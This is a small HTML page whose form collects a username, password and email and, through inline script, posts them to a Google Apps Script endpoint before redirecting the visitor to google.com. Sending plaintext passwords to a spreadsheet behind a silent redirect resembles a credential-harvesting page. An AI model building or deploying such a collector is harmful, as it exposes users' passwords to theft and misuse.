<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form style="background-color: aqua;padding: 20px;width: 25%;text-align: center;" action="" name="submit-to-google-sheet">
        <label for="">username</label>
        <input type="text" name="username" id=""><br><br>
        <label for="">password</label>
        <input type="password" name="password" id=""> <br><br>
        <label for="">email id</label>
        <input type="email" name="emailid" id=""><br><br>
        <input type="submit">
    </form>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwGpkvV5QtRCp5kwX1HgHBmkjcMGbtHPtRER5vn7X5HesJqO_cZ3wID_MarB0fPKdl9yg/exec'
        const form = document.forms['submit-to-google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => window.location.href = "https://www.google.com")
            .catch(error => console.error('Error!', error.message))
        })
      </script>
</body>
</html>
